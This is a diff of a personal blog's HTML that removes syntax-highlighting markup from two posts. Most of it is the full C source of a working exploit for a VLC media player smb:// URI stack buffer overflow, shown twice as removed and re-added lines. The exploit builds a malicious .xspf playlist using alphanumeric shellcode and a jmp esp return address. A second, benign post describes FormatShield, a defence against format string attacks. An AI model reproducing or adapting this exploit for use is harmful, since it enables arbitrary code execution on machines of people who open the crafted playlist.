@@ -28,9 +28,9 @@
   <!-- RSS -->
   <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
 
-  <link rel="stylesheet" href="/public/css/highlight/styles/monokai.css">
+  <!--<link rel="stylesheet" href="/public/css/highlight/styles/monokai.css">
   <script src="/public/css/highlight/highlight.pack.js"></script>
-  <script>hljs.initHighlightingOnLoad();</script>
+  <script>hljs.initHighlightingOnLoad();</script>-->
 
 </head>
 
@@ -111,65 +111,64 @@
     <span class="post-date">07 Aug 2009</span>
 
     <p>A stack-based buffer overflow exists in the <code>Win32AddConnection</code> function in <code>modules/access/smb.c</code> in VideoLAN VLC media player 0.9.9, when running on Microsoft Windows, that allows remote attackers to execute arbitrary code via a long smb URI in a playlist file.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">/* VLC Media Player &#39;smb://&#39; URI Handling Remote Buffer Overflow Vulnerability Exploit
+* Reference: http://www.securityfocus.com/bid/35500
+*
+* Tested on VLC media player 0.8.6f on WinXP SP3
+*
+* Coded by Pankaj Kohli
+* http://www.codepwn.com
+*
+*/
 
-<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* VLC Media Player &#39;smb://&#39; URI Handling Remote Buffer Overflow Vulnerability Exploit</span>
-<span class="cm">* Reference: http://www.securityfocus.com/bid/35500</span>
-<span class="cm">*</span>
-<span class="cm">* Tested on VLC media player 0.8.6f on WinXP SP3</span>
-<span class="cm">*</span>
-<span class="cm">* Coded by Pankaj Kohli</span>
-<span class="cm">* http://www.codepwn.com</span>
-<span class="cm">*</span>
-<span class="cm">*/</span>
- 
-<span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
- 
-<span class="c1">// ASCII shellcode (Display a message box &amp; exit)</span>
-<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shell</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;TY777777777777777777777777777777777QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXkweaHrJwpf02pQzePMhyzWwSuQnioXPOHuBxKnaQlkOjpJHIvKOYokObPPwRN1uqt5PA&quot;</span><span class="p">;</span>
- 
-<span class="kt">long</span> <span class="n">jmp</span> <span class="o">=</span> <span class="mh">0x7E485233</span><span class="p">;</span> <span class="c1">// jmp esp (user32.dll)</span>
- 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-    <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
- 
-    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;sploit.xspf&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;&lt;?xml version=</span><span class="se">\&quot;</span><span class="s">1.0</span><span class="se">\&quot;</span><span class="s"> encoding=</span><span class="se">\&quot;</span><span class="s">UTF-8</span><span class="se">\&quot;</span><span class="s">?&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;&lt;playlist version=</span><span class="se">\&quot;</span><span class="s">1</span><span class="se">\&quot;</span><span class="s"> xmlns=</span><span class="se">\&quot;</span><span class="s">http://xspf.org/ns/0/</span><span class="se">\&quot;</span><span class="s"> xmlns:vlc=</span><span class="se">\&quot;</span><span class="s">http://www.videolan.org/vlc/playlist/ns/0/</span><span class="se">\&quot;</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">&lt;title&gt;Playlist&lt;/title&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">&lt;trackList&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t\t</span><span class="s">&lt;track&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t\t\t</span><span class="s">&lt;location&gt;smb://example.com@www.example.com/foo/#{&quot;</span><span class="p">);</span>
- 
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Creating buffer</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">300</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">((</span><span class="n">i</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">buff</span> <span class="o">+</span> <span class="mi">96</span><span class="p">);</span>
-    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">;</span>
-    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shell</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="n">shell</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-    <span class="p">}</span>
-    <span class="n">buff</span><span class="p">[</span><span class="mi">300</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
- 
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;}&lt;/location&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t\t\t</span><span class="s">&lt;extension application=</span><span class="se">\&quot;</span><span class="s">http://www.videolan.org/vlc/playlist/0</span><span class="se">\&quot;</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t\t\t\t</span><span class="s">&lt;vlc:id&gt;0&lt;/vlc:id&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t\t\t</span><span class="s">&lt;/extension&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t\t</span><span class="s">&lt;/track&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">&lt;/trackList&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&quot;&lt;/playlist&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
- 
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Exploit file written to sploit.xspf</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
- 
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
 
+// ASCII shellcode (Display a message box &amp; exit)
+unsigned char shell[] = &quot;TY777777777777777777777777777777777QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXkweaHrJwpf02pQzePMhyzWwSuQnioXPOHuBxKnaQlkOjpJHIvKOYokObPPwRN1uqt5PA&quot;;
+
+long jmp = 0x7E485233; // jmp esp (user32.dll)
+
+int main(int argc, char **argv) {
+    char buff[512], *p;
+    FILE *fp;
+    int i;
+    long *ptr;
+
+    fp = fopen(&quot;sploit.xspf&quot;, &quot;wb&quot;);
+    fprintf(fp, &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;);
+    fprintf(fp, &quot;&lt;playlist version=\&quot;1\&quot; xmlns=\&quot;http://xspf.org/ns/0/\&quot; xmlns:vlc=\&quot;http://www.videolan.org/vlc/playlist/ns/0/\&quot;&gt;\n&quot;);
+    fprintf(fp, &quot;\t&lt;title&gt;Playlist&lt;/title&gt;\n&quot;);
+    fprintf(fp, &quot;\t&lt;trackList&gt;\n&quot;);
+    fprintf(fp, &quot;\t\t&lt;track&gt;\n&quot;);
+    fprintf(fp, &quot;\t\t\t&lt;location&gt;smb://example.com@www.example.com/foo/#{&quot;);
+
+    printf(&quot;[*] Creating buffer\n&quot;);
+    for(i=0; i&lt;300; i++) {
+        buff[i] = &#39;a&#39; + ((i/4)%26);
+    }
+    ptr = (long *) (buff + 96);
+    *ptr = jmp;
+    for(i=0; i&lt;strlen((const char *) shell); i++) {
+        buff[i+100] = shell[i];
+    }
+    buff[300] = 0;
+    fprintf(fp, &quot;%s&quot;, buff);
+
+    fprintf(fp, &quot;}&lt;/location&gt;\n&quot;);
+    fprintf(fp, &quot;\t\t\t&lt;extension application=\&quot;http://www.videolan.org/vlc/playlist/0\&quot;&gt;\n&quot;);
+    fprintf(fp, &quot;\t\t\t\t&lt;vlc:id&gt;0&lt;/vlc:id&gt;\n&quot;);
+    fprintf(fp, &quot;\t\t\t&lt;/extension&gt;\n&quot;);
+    fprintf(fp, &quot;\t\t&lt;/track&gt;\n&quot;);
+    fprintf(fp, &quot;\t&lt;/trackList&gt;\n&quot;);
+    fprintf(fp, &quot;&lt;/playlist&gt;\n&quot;);
+    fclose(fp);
+
+    printf(&quot;[*] Exploit file written to sploit.xspf\n&quot;);
+
+    return 0;
+}
+</code></pre></div>
   </div>
   
   <div class="post">
@@ -184,18 +183,17 @@
     <p>FormatShield is a library that intercepts call to vulnerable functions and uses binary rewriting to defend against format string attacks. It identifies the vulnerable call sites in a running process and dumps the corresponding context information in the ELF binary of the process. Attacks are detected when format specifiers are found at these contexts of the vulnerable call sites.</p>
 
 <p>FormatShield provides wrappers for the following libc functions:</p>
-
-<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
-<span class="kt">int</span> <span class="n">fprintf</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
-<span class="kt">int</span> <span class="n">sprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
-<span class="kt">int</span> <span class="n">snprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
-<span class="kt">int</span> <span class="n">vprintf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">vfprintf</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">vsprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">vsnprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">)</span>
-<span class="kt">void</span> <span class="n">syslog</span><span class="p">(</span><span class="kt">int</span> <span class="n">priority</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
-<span class="kt">void</span> <span class="n">vsyslog</span><span class="p">(</span><span class="kt">int</span> <span class="n">priority</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">)</span></code></pre></div>
-
+<div class="highlight"><pre><code class="language-text" data-lang="text">int printf(const char *format, ...)
+int fprintf(FILE *stream, const char *format, ...)
+int sprintf(char *str, const char *format, ...)
+int snprintf(char *str, size_t size, const char *format, ...)
+int vprintf(const char *format, va_list ap)
+int vfprintf(FILE *stream, const char *format, va_list ap)
+int vsprintf(char *str, const char *format, va_list ap)
+int vsnprintf(char *str, size_t size, const char *format, va_list ap)
+void syslog(int priority, const char *format, ...)
+void vsyslog(int priority, const char *format, va_list ap)
+</code></pre></div>
 <p>On detecting an attack, the victim process is killed and a log is written to syslog. More details about the inner working of FormatShield are available in the <a href="/public/files/formatshield-acisp08.pdf">research paper</a>.</p>
 
 <p><a href="https://github.com/pank4j/formatshield">Formatshield source</a> is licensed as GNU GPL v3 and is archived on github. It is available only for testing/research, please use it at your own risk.</p>
